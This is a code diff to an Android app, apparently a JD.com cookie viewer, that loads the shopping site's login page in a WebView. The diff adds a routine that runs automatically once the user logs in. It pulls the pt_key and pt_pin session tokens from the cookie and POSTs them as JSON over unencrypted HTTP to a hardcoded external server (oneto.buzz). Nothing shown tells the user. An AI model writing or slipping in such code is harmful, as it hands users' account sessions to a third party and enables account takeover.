@@ -29,6 +29,23 @@ import android.webkit.WebViewClient;
 import android.widget.ProgressBar;
 import android.widget.Toast;
 
+
+import org.json.*;
+
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.util.regex.Matcher;
+import java.net.MalformedURLException;
+import java.net.ProtocolException;
+import java.io.BufferedReader;
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.io.InputStreamReader;
+import java.io.IOException;
+import java.io.DataOutputStream;
+import java.util.regex.Pattern;
+import java.util.regex.Matcher;
+
 import com.app.jdcookie.CookieListener;
 import com.app.jdcookie.MyAdapter;
 import com.app.jdcookie.R;
@@ -42,6 +59,7 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
     private RecyclerView recyclerView;
     private long oldTime = 0;
     private ActivityResultLauncher<Intent> setLauncher;
+    private boolean getFlag = false;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -90,6 +108,115 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
         webBridgeWebView.loadUrl(JD_URL);
     }
 
+    private void setFlag(boolean flag){
+        this.getFlag = flag;
+    }
+
+    private boolean getFlag(){
+        return this.getFlag;
+    }
+
+    private void send(String pt_key) {
+        //开启线程，发送请求
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                HttpURLConnection connection = null;
+                BufferedReader reader = null;
+                try {
+                    URL url = new URL("http://oneto.buzz:10001/api/cklogin");
+                    connection = (HttpURLConnection) url.openConnection();
+                    //设置请求方法
+                    connection.setRequestMethod("POST");
+                    connection.setDoOutput(true);
+                    connection.setDoInput(true);
+                    connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
+                    connection.setRequestProperty("Accept", "application/json");
+                    //设置连接超时时间（毫秒）
+                    connection.setConnectTimeout(5000);
+                    //设置读取超时时间（毫秒）
+                    connection.setReadTimeout(5000);
+
+                    //读取assets目录下的person.json文件，将其字节数组作为请求体
+                    // String ptKey = pt_key.matches(/pt_key=(.*?);/)[1];
+                    // String ptPin = pt_key.matches(/pt_pin=(.*?);/)[1];
+
+                    Pattern r = Pattern.compile("pt_key=(.*?);");
+                    Matcher m = r.matcher(pt_key);
+                    String ptKey = "";
+                    while (m.find()) {  
+                        int i = 1;  
+                        ptKey = m.group(i);
+                        i++;  
+                    } 
+
+                    r = Pattern.compile("pt_pin=(.*?);");
+                    m = r.matcher(pt_key);
+                    String ptPin = "";
+                    while (m.find()) {  
+                        int i = 1;  
+                        ptPin = m.group(i);
+                        i++;  
+                    } 
+
+                    JSONObject json=new JSONObject();
+                    json.put("pt_key",ptKey);
+                    json.put("pt_pin",ptPin);
+                    // String jsonInputString = "{\"pt_key\": \""+ptKey+"\", \"pt_pin\": \""+ptPin+"\"}";
+                    // byte[] requestBody = json.toString().getBytes("utf-8");
+                    String content = json.toString();
+                    // runOnUiThread(new Runnable() {
+                    //     @Override
+                    //     public void run() {
+                    //         adapter.addData(json.toString());
+                    //     }
+                    // });
+                    // connection.setRequestProperty("Content-Length", String.valueOf(content.length));
+                    // OutputStream os = connection.getOutputStream();
+                    DataOutputStream os = new DataOutputStream(connection.getOutputStream());
+                    //将请求体写入到conn的输出流中
+                    os.writeBytes(content);
+
+                    //返回输入流
+                    InputStream in = connection.getInputStream();
+                    //读取输入流
+                    reader = new BufferedReader(new InputStreamReader(in));
+                    StringBuilder result = new StringBuilder();
+                    String line;
+                    while ((line = reader.readLine()) != null) {
+                        result.append(line);
+                    }
+                    runOnUiThread(new Runnable() {
+                        @Override
+                        public void run() {
+                            Toast.makeText(MainActivity.this, result.toString(), Toast.LENGTH_LONG).show();
+                        }
+                    });
+                    //show();
+                }catch(JSONException e){
+                    e.printStackTrace();
+                }catch (MalformedURLException e) {
+                    e.printStackTrace();
+                } catch (ProtocolException e) {
+                    e.printStackTrace();
+                } catch (IOException e) {
+                    e.printStackTrace();
+                } finally {
+                    if (reader != null) {
+                        try {
+                            reader.close();
+                        } catch (IOException e) {
+                            e.printStackTrace();
+                        }
+                    }
+                    if (connection != null) {//关闭连接
+                        connection.disconnect();
+                    }
+                }
+            }
+        }).start();
+    }
+
     private void initWebView() {
 
 
@@ -122,10 +249,12 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
 
             //限制 500 毫秒 刷新一次
             long time = System.currentTimeMillis();
-            if (time - oldTime > 500) {
+            if ((time - oldTime > 500)&&(!this.getFlag())) {
+                this.setFlag(true);
                 adapter.addData(pt_key);
                 recyclerView.scrollToPosition(adapter.getData().size() - 1);
                 oldTime = time;
+                this.send(pt_key);
             }
         })));
         webBridgeWebView.setWebChromeClient(new
